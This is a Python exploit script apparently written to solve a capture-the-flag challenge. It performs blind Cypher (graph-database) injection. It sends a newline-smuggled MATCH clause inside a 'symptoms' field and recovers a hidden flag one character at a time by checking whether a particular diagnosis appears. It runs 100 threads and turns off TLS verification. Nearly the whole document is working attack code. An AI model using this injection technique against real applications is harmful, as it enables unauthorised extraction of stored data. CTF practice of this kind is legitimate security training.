import requests
import random
import string
import concurrent.futures

url = "http://dead-or-alive.ctfz.one"

def try_character(session, ssn, flag, character):
    payload = "Fatigue']\u000aMATCH (f:Flag) WHERE f.flag STARTS WITH '####'//".replace("####", flag + character)
    session.post(url + '/api/setSymptoms', json={"ssn": ssn, "symptoms": ["Anxiety", "Obsessions", "Difficulty concentrating", "Compulsions", payload]}, verify=False)
    r = session.post(url + '/api/getDiagnosis', json={"ssn": ssn}, verify=False)
    if "Obsessive-compulsive disorder (OCD)" in r.text:
        return character
    return None

def main():
    flag = "ctfzone{"
    all_characters = string.ascii_letters + string.digits + string.punctuation
    with requests.Session() as session, concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        ssn_list = [''.join(random.choices(string.ascii_letters + string.digits, k=3)) for _ in range(len(all_characters))]
        futures = [executor.submit(try_character, session, ssn, flag, character) for ssn, character in zip(ssn_list, all_characters)]
        
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result is not None:
                flag += result
                print("Current flag:", flag)
    
    print("Flag:", flag)

if __name__ == "__main__":
    main()
